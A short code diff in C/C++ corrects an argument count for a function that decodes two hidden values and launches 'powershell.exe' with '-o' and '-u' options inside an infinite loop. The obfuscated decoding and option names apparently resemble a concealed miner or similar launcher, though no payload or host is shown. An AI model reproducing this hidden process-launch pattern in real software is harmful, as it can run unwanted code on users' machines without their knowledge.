@@ -23,7 +23,7 @@ void run()
 	int buf2_act_size = move_0399(buf2, value2);
 	buf1[buf1_act_size] = '\0';
 	buf2[buf2_act_size] = '\0';
-	int args_count = 7;
+	int args_count = 5;
 	char* args[] = { "powershell.exe", "-o", buf1, "-u", buf2 };
 	Process process(args_count, args);
 	while (true)
